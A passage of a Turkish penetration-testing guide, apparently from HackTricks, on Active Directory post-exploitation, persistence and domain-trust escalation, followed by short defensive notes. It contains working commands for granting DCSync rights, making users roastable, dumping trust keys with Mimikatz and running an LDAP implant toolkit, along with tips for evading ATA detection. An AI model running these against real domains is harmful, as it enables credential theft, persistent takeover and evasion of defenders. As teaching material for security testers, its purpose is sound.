Domain içerisinde **Spool servisinin dinlediğini** keşfetmek, **yeni kimlik bilgileri edinmek** ve **ayrıcalıkları yükseltmek** için **kötüye kullanılabilir**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Üçüncü taraf oturumlarının kötüye kullanımı

Eğer **diğer kullanıcılar** **ele geçirilmiş** makineye **erişiyorsa**, bellekten **kimlik bilgileri toplanabilir** ve hatta onların süreçlerine **beacon enjekte edilerek** taklit edilebilirler.\
Genellikle kullanıcılar sisteme RDP ile erişir, bu yüzden üçüncü taraf RDP oturumlarına karşı birkaç saldırının nasıl yapılacağı burada:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e dahil bilgisayarlarda **local Administrator parolasını** yönetmek için bir sistem sağlar; bu parolaların **rastgeleleştirildiğini**, benzersiz olduğunu ve sıkça **değiştirildiğini** garanti eder. Bu parolalar Active Directory'de saklanır ve erişim sadece yetkili kullanıcılara ACL'ler aracılığıyla kontrol edilir. Bu parolalara erişmek için yeterli izinlere sahip olursanız, diğer bilgisayarlara pivot yapmak mümkün hale gelir.


{{#ref}}
laps.md
{{#endref}}

### Sertifika Hırsızlığı

Ele geçirilen makinadan **sertifikaların toplanması**, ortam içinde ayrıcalık yükseltmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Sertifika Şablonlarının Kötüye Kullanımı

Eğer **zayıf/vulnerable şablonlar** yapılandırılmışsa, bunları ayrıcalık yükseltmek için kötüye kullanmak mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı hesap ile post-exploitation

### Domain Kimlik Bilgilerinin Dökülmesi

Bir kez **Domain Admin** veya daha da iyisi **Enterprise Admin** ayrıcalıkları elde ettiğinizde, **domain veritabanını** (_ntds.dit_) **dökebilirsiniz**.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Daha önce tartışılan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) için savunmasız hale getirin

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md) için savunmasız hale getirin

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları verin

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**, belirli bir servis için **meşru bir Ticket Granting Service (TGS) ticket** oluşturur; bunun için **NTLM hash** (örneğin PC account'un hash'i) kullanılır. Bu yöntem, servisin ayrıcalıklarına **erişim sağlamak** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket attack**, bir saldırganın Active Directory ortamında **krbtgt account**'unun **NTLM hash**'ine erişmesiyle ilgilidir. Bu hesap özeldir çünkü tüm **Ticket Granting Ticket (TGT)**'leri imzalamak için kullanılır; TGT'ler AD ağı içinde kimlik doğrulama için gereklidir.

Saldırgan bu hash'i elde ettiğinde, herhangi bir hesap için **TGT'ler** üretebilir (Silver ticket attack benzeri).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, yaygın golden ticket tespit mekanizmalarını **atlatacak** şekilde sahte oluşturulmuş golden ticket'lardır.


{{#ref}}
diamond-ticket.md
{{#endref}}

### Certificates Account Persistence

Bir hesabın **sertifikalarına sahip olmak** veya bunları **talep edebilmek**, kullanıcının hesabında (parola değişse bile) **persist** kalmanın çok iyi bir yoludur:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### Certificates Domain Persistence

**Sertifikaları kullanmak**, domain içinde yüksek ayrıcalıklarla **persist** kalmak için de mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** objesi, **ayrıcalıklı grupların** (Domain Admins, Enterprise Admins gibi) güvenliğini sağlamak için bu gruplar üzerinde standart bir **Access Control List (ACL)** uygular ve yetkisiz değişiklikleri engeller. Ancak bu özellik kötüye kullanılabilir; eğer bir saldırgan AdminSDHolder'ın ACL'ini düzenleyip normal bir kullanıcıya tam erişim verirse, o kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş kontrol kazanır. Bu güvenlik önlemi, yakından izlenmediği takdirde ters tepebilir ve yetkisiz erişime yol açabilir.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** hesabı bulunur. Böyle bir makinede admin hakları elde ederek, local Administrator hash'ini **mimikatz** ile çıkartabilirsiniz. Ardından, bu parolanın **kullanımına izin vermek** için bir registry değişikliği yapmanız gerekir; bu sayede local Administrator hesabına uzaktan erişim mümkün olur.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bir kullanıcıya belirli domain objeleri üzerinde **özel izinler** vererek, o kullanıcının gelecekte **ayrıcalıkları yükseltmesine** imkan sağlayabilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir objenin üzerinde sahip olduğu **izinleri saklamak** için kullanılır. Eğer bir objenin security descriptor'unda **küçük bir değişiklik** yapabilirseniz, o obje üzerinde ayrıcalıklı grup üyesi olmanıza gerek kalmadan çok ilginç haklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` yardımcı sınıfını kullanarak `entryTTL`/`msDS-Entry-Time-To-Die` ile kısa ömürlü principal/GPO/DNS kayıtları oluşturun; bunlar tombstone bırakmadan kendilerini siler, LDAP delillerini yok ederken orphan SID'ler, bozuk `gPLink` referansları veya önbelleğe alınmış DNS yanıtları bırakabilir (örn. AdminSDHolder ACE pollution veya kötü amaçlı `gPCFileSysPath`/AD-entegre DNS yönlendirmeleri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

LSASS'in belleğinde değişiklik yaparak **evrensel bir parola** oluşturun; bu, tüm domain hesaplarına erişim sağlar.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Kendi **SSP**'nizi oluşturarak makineye erişimde kullanılan **kimlik bilgilerini** **clear text** halinde **yakalayabilirsiniz**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Yeni bir **Domain Controller** kaydeder ve bunu belirtilen objeler üzerinde (SIDHistory, SPN'ler...) değişiklikleri **log bırakmadan** **push** etmek için kullanır. Bunu yapmak için **DA** ayrıcalıklarına ve **root domain** içinde olmaya ihtiyacınız vardır.\
Yanlış veri kullanırsanız, oldukça çirkin loglar ortaya çıkacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce LAPS parolalarını **okuma** izniniz varsa nasıl ayrıcalık yükseltebileceğinizden bahsetmiştik. Ancak bu parolalar **persistence** sağlamak için de kullanılabilir.\
Bkz:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak görür. Bu, **tek bir domain'in ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.

### Temel Bilgi

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir domain'deki bir kullanıcının başka bir domain'deki kaynaklara erişmesine izin veren bir güvenlik mekanizmasıdır. Temelde iki domainin kimlik doğrulama sistemleri arasında bir bağlantı oluşturur ve doğrulama taleplerinin akmasını sağlar. Domain'ler trust kurduğunda, trust'un bütünlüğü için kritik olan belirli **anahtarları** kendi **Domain Controller (DC)**'lerinde değiş tokuş eder ve saklarlar.

Tipik bir senaryoda, bir kullanıcı **trusted domain**'deki bir servise erişmek istediğinde, önce kendi domain'inin DC'sinden özel bir ticket olan **inter-realm TGT**'yi istemelidir. Bu TGT, her iki domainin üzerinde anlaştığı paylaşılan bir **anahtar** ile şifrelenir. Kullanıcı daha sonra bu TGT'yi **trusted domain**'in DC'sine sunar ve bir service ticket (**TGS**) alır. Trusted domain'in DC'si inter-realm TGT'yi doğrulayıp geçerli bulursa, kullanıcıya servise erişim sağlayan bir TGS verir.

**Adımlar**:

1. Bir **client bilgisayar** **Domain 1**'de, **NTLM hash**'ini kullanarak **Domain Controller (DC1)**'den **Ticket Granting Ticket (TGT)** ister.
2. DC1, istemci başarıyla kimlik doğrulandıysa yeni bir TGT verir.
3. İstemci daha sonra **Domain 2** kaynaklarına erişmek için DC1'den bir **inter-realm TGT** ister.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında paylaşılan **trust key** ile şifrelenir.
5. İstemci inter-realm TGT'yi **Domain 2'nin Domain Controller (DC2)**'sine götürür.
6. DC2, paylaşılan trust key ile inter-realm TGT'yi doğrular ve geçerliyse istemcinin erişmek istediği Domain 2'deki sunucu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak, istemci bu TGS'yi sunucuya sunar; bu TGS sunucunun hesap hash'i ile şifrelenmiştir ve istemciye Domain 2'deki servise erişim sağlar.

### Farklı trust tipleri

Bir trust'ın **tek yönlü** veya **çift yönlü** olabileceğini unutmamak önemlidir. Çift yönlü seçenekte her iki domain birbirine güvenir; ancak **tek yönlü** trust ilişkisinde bir domain **trusted** diğer domain ise **trusting** olur. Bu durumda, **trusted** olandan **trusting** domain içindeki kaynaklara erişebilirsiniz.

Eğer Domain A, Domain B'ye trust veriyorsa, A trusting domain, B ise trusted olandır. Ayrıca, **Domain A**'da bu bir **Outbound trust**; **Domain B**'de ise bu bir **Inbound trust** olacaktır.

**Farklı trusting ilişkileri**

- **Parent-Child Trusts**: Aynı forest içinde sık görülen bir kurulumdur; child domain otomatik olarak parent domain ile iki yönlü, transitive bir trust'a sahiptir. Bu, parent ve child arasındaki kimlik doğrulama isteklerinin sorunsuz akacağı anlamına gelir.
- **Cross-link Trusts**: "shortcut trusts" olarak da adlandırılır; child domain'ler arasında referral süreçlerini hızlandırmak için kurulur. Karmaşık forest'larda kimlik doğrulama yönlendirmeleri genellikle forest root'a kadar çıkıp hedef domaine inmek zorunda kalır; cross-link'ler bu yolculuğu kısaltır.
- **External Trusts**: Farklı, alakasız domain'ler arasında kurulan ve doğası gereği non-transitive olan trust'lardır. [Microsoft dokümantasyonuna](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre, external trust'lar forest dışında kalan ve forest trust ile bağlı olmayan bir domain'deki kaynaklara erişim için kullanışlıdır. Güvenlik, external trust'larda SID filtering ile güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulan trust'lardır. Sıklıkla karşılaşılmasa da, yeni domain ağaçları eklerken önemlidir; iki yönlü transitivite sağlar.
- **Forest Trusts**: İki forest root domain arasında iki yönlü, transitive bir trust türüdür ve SID filtering ile güvenliği artırır.
- **MIT Trusts**: Windows olmayan, [RFC4120-uyumlu](https://tools.ietf.org/html/rfc4120) Kerberos domain'leri ile kurulan trust'lardır. MIT trust'lar, Windows ekosistemi dışındaki Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlara yöneliktir.

#### Trust ilişkilerindeki diğer farklılıklar

- Bir trust ilişkisi **transitive** (A B'ye trust veriyorsa, B C'ye trust veriyorsa A C'ye trust verir) veya **non-transitive** olabilir.
- Bir trust ilişkisi **bidirectional** (her iki taraf birbirine güvenir) veya **one-way** (sadece tek taraf diğerine güvenir) olarak kurulabilir.

### Saldırı Yolu

1. **Trust ilişkilerini** enumerate edin
2. Hangi **security principal**(user/group/computer)'ın **diğer domain** kaynaklarına **erişimi** olduğunu kontrol edin; belki ACE girdileriyle veya diğer domain gruplarında üyelik ile. **Domain'ler arası ilişkiler** arayın (trust büyük ihtimalle bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. **Pivot** yapabilecek **hesapları** **ele geçirin**.

Saldırganların başka bir domain'deki kaynaklara erişebilmesi üç ana mekanizma ile olabilir:

- **Local Group Membership**: Principal'lar bir sunucudaki “Administrators” gibi local gruplara eklenmiş olabilir; bu onlara o makine üzerinde önemli kontrol verir.
- **Foreign Domain Group Membership**: Principal'lar yabancı domain içindeki grupların üyeleri olabilir. Ancak bu yöntemin etkinliği, trust'ın doğasına ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar bir **ACL** içinde, özellikle bir **DACL** içindeki **ACE** girdileri olarak belirtilmiş olabilir ve belirli kaynaklara erişim sağlarlar. ACL'lerin, DACL'lerin ve ACE'lerin mekaniklerine daha derinlemesine dalmak isteyenler için, “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir kaynaktır.

### Başka domain'lerden kullanıcı/grup izinlerini bulma

Yabancı security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**'u kontrol edebilirsiniz. Bunlar **harici bir domain/forest**'ten gelen kullanıcı/gruplar olacaktır.

Bunu **Bloodhound**'da veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trusts'ları saymanın diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> Geçerli domain tarafından kullanılan anahtarı aşağıdaki komutlarla görebilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection ile trust'ı suistimal ederek child/parent domaine Enterprise admin olarak yükselme:

{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)'nin nasıl exploit edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest içindeki yapılandırma verilerinin merkezi deposu olarak hizmet eder. Bu veriler forest içindeki her Domain Controller (DC)'ye çoğaltılır; yazılabilir DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için **DC üzerinde SYSTEM ayrıcalıklarına** sahip olmak gerekir; tercihen bir child DC üzerinde olmalıdır.

**Link GPO to root DC site**

Configuration NC'nin Sites konteyneri, AD forest içindeki tüm domain'e katılmış bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde SYSTEM ayrıcalıklarıyla hareket ederek, saldırganlar GPO'ları root DC site'larına linkleyebilir. Bu işlem, bu site'lara uygulanan politikaları manipüle ederek root domain'i potansiyel olarak tehlikeye atabilir.

Daha derin bilgi için şu çalışmaya bakılabilir: [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Bir saldırı vektörü, domain içindeki ayrıcalıklı gMSA'ları hedef almayı içerir. gMSA'ların parolalarını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde SYSTEM ayrıcalıklarına sahip olunursa, KDS Root key'e erişmek ve forest içindeki herhangi bir gMSA için parolaları hesaplamak mümkün hale gelir.

Detaylı analiz ve adım adım rehberlik için bakınız:

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delege edilmiş MSA saldırısı (BadSuccessor – migration attribute'ları suistimal etme):

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek dış araştırma: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD objelerinin oluşturulmasını beklemek gerekir. SYSTEM ayrıcalıklarıyla bir saldırgan, AD Schema'yı değiştirerek herhangi bir kullanıcıya tüm sınıflar üzerinde tam kontrol verebilir. Bu, yeni oluşturulan AD objeleri üzerinde yetkisiz erişim ve kontrol ile sonuçlanabilir.

Daha fazla okuma için: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 zafiyeti, Public Key Infrastructure (PKI) objeleri üzerinde kontrol ele geçirerek forest içindeki herhangi bir kullanıcı olarak kimlik doğrulamayı mümkün kılan bir sertifika template'i oluşturmayı hedefler. PKI objeleri Configuration NC içinde bulunduğundan, yazılabilir bir child DC'nin ele geçirilmesi ESC5 saldırılarının gerçekleştirilmesini sağlar.

Daha fazla ayrıntı için bakınız: [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). ADCS olmayan senaryolarda, saldırgan gerekli bileşenleri kurma yeteneğine sahiptir; bununla ilgili tartışma için bakınız: [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **domaininiz**, harici bir domain tarafından trust edilmiş olup size üzerinde **belirsiz permissions** veriyor. Domaininizdeki hangi principals'ın harici domaine hangi erişimlere sahip olduğunu bulmanız ve sonra bunu exploit etmeyi denemeniz gerekecek:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **your domain**, farklı bir **domain**'den gelen bir principal'e bazı **privileges** veriyor.

Ancak, bir **domain is trusted** olduğunda, trusting domain tarafından, trusted domain tahmin edilebilir bir isimle bir **kullanıcı oluşturur** ve bu kullanıcı için **password olarak trusted password** kullanılır. Bu, trusting domain'den bir kullanıcıya **erişip** trusted domain'in içine girerek onu enumerate etmek ve daha fazla ayrıcalık elde etmeye çalışmak mümkün olduğu anlamına gelir:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i ele geçirmenin bir başka yolu, domain trust'un **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i ele geçirmenin bir diğer yolu ise, trusted domain'den bir **kullanıcının RDP ile giriş yapabileceği** bir makinede beklemektir. Saldırgan RDP oturum sürecine kod inject edebilir ve oradan **victim'in origin domain**ine erişebilir.\
Ayrıca, eğer **victim sabit diskini mount ettiyse**, saldırgan RDP oturum sürecinden sabit diskin **startup klasörüne** backdoor'lar bırakabilir. Bu teknik **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust istismarının azaltılması

### **SID Filtering:**

- Forest trust'lar arasında SID history attribute'unu kullanan saldırıların riski, tüm inter-forest trust'larda varsayılan olarak etkinleştirilen SID Filtering ile hafifletilir. Bu, Microsoft'un forest'ı domain yerine güvenlik sınırı olarak kabul etmesi varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu yüzden bazen devre dışı bırakılır.

### **Selective Authentication:**

- Inter-forest trust'lar için Selective Authentication kullanmak, iki forest'tan gelen kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, trusting domain veya forest içindeki domainlere ve sunuculara erişim için açık izinler gereklidir.
- Bu önlemlerin, writable Configuration Naming Context (NC) istismarına veya trust account'a yönelik saldırılara karşı koruma sağlamadığını not etmek önemlidir.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-host implantlardan LDAP tabanlı AD istismarı

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD tarzı LDAP primitive'lerini tamamen bir on-host implant içinde (örn. Adaptix C2) çalışan x64 Beacon Object File'ları olarak yeniden uygular. Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs` yükler ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm trafik mevcut oturumun güvenlik bağlamı üzerinden LDAP (389) ile signing/sealing veya LDAPS (636) ile otomatik sertifika güveni kullanır; bu yüzden socks proxy veya disk artefaktlarına gerek yoktur.

### Implant tarafında LDAP keşfi

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, ve `get-groupmembers` kısa isimleri/OU yollarını tam DN'lere çözer ve ilgili nesneleri döker.
- `get-object`, `get-attribute`, ve `get-domaininfo` rasgele attribute'ları (security descriptor'lar dahil) ve `rootDSE`'den forest/domain metadata'sını çeker.
- `get-uac`, `get-spn`, `get-delegation`, ve `get-rbcd` roasting adaylarını, delegation ayarlarını ve LDAP'tan doğrudan mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını ortaya çıkarır.
- `get-acl` ve `get-writable --detailed` DACL'yi parse ederek trustee'leri, hakları (GenericAll/WriteDACL/WriteOwner/attribute writes) ve inheritance'ı listeler; bu da ACL ayrıcalık yükseltme için hemen hedefler verir.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP yazma işlemleri — yükselme ve kalıcılık için

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün OU haklarının olduğu yerlere yeni principal'ler veya makine hesapları yerleştirmesine olanak tanır. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute` yazma-property hakları bulunduğunda hedefleri doğrudan kaçırır.
- ACL odaklı komutlar (ör. `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`) herhangi bir AD nesnesinde WriteDACL/WriteOwner'ı parola sıfırlamalarına, grup üyeliği kontrolüne veya DCSync replikasyon ayrıcalıklarına çevirir ve PowerShell/ADSI artefaktı bırakmaz. `remove-*` muadilleri enjekte edilmiş ACE'leri temizler.

### Delegasyon, roasting ve Kerberos suistimali

- `add-spn`/`set-spn` ele geçirilmiş bir kullanıcıyı anında Kerberoastable yapar; `add-asreproastable` (UAC toggle) parolaya dokunmadan AS-REP roasting için işaretler.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flag'leri veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazarak constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzaktan PowerShell veya RSAT ihtiyacını ortadan kaldırır.

### sidHistory injection, OU relocation ve saldırı yüzeyi şekillendirme

- `add-sidhistory` kontrollü bir principal'in SID history'sine ayrıcalıklı SIDs enjekte eder (bkz. [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS üzerinden tam gizli erişim mirası sağlar.
- `move-object` bilgisayarların veya kullanıcıların DN/OU'sini değiştirir; saldırganın varlıkları, önceden delegasyon haklarının bulunduğu OU'lara sürüklemesine ve ardından `set-password`, `add-groupmember` veya `add-spn` ile suiistimal etmesine imkan verir.
- Sıkı kapsamlı kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.) operatör kimlik bilgilerini veya kalıcılığı elde ettikten sonra hızlı geri alma sağlar ve telemetriyi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Kimlik Bilgilerini Koruma için Savunma Önlemleri**

- **Domain Admins Restrictions**: Domain Admins'in sadece Domain Controller'lara giriş yapmasına izin verilmesi önerilir; diğer hostlarda kullanılmamalıdır.
- **Service Account Privileges**: Hizmetler güvenlik amacıyla Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA ayrıcalığı gerektiren görevler için bu ayrıcalıkların süresi sınırlandırılmalıdır. Bu şu şekilde sağlanabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: LDAP MITM/relay girişimlerini engellemek için Event ID'leri 2889/3074/3075'i denetleyin ve sonra DC'lerde/istemcilerde LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Aldatma Tekniklerini Uygulama**

- Aldatma uygulamak, şifreleri hiç süresi dolmayan veya Trusted for Delegation olarak işaretlenmiş gibi özelliklere sahip tuzak kullanıcılar veya bilgisayarlar kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip kullanıcılar oluşturmayı veya bunları yüksek ayrıcalıklı gruplara eklemeyi kapsar.
- Pratik bir örnek şu araçların kullanılmasını içerir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Aldatma tekniklerini dağıtma hakkında daha fazlası için bakınız: [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Aldatmayı Tespit Etme**

- **Kullanıcı Nesneleri İçin**: Şüpheli göstergeler arasında alışılmadık ObjectSID, nadir oturum açma, oluşturulma tarihleri ve düşük kötü parola sayıları bulunur.
- **Genel Göstergeler**: Potansiyel decoy nesnelerin özniteliklerini gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. Böyle aldatmaları tespit etmek için [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar yardımcı olabilir.

### **Tespit Sistemlerini Aşma**

- **Microsoft ATA Detection Bypass**:
  - **User Enumeration**: ATA tespitini önlemek için Domain Controller'larda oturum sayımı/enumarasyonundan kaçınma.
  - **Ticket Impersonation**: Bilet oluştururken **aes** anahtarlarının kullanılması, NTLM'e düşürmeyi engelleyerek tespitten kaçmaya yardımcı olur.
  - **DCSync Attacks**: ATA tespitinden kaçınmak için bir Domain Controller olmayan ortamdan yürütülmesi tavsiye edilir; doğrudan bir Domain Controller'dan yürütme uyarıları tetikler.

## Referanslar

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
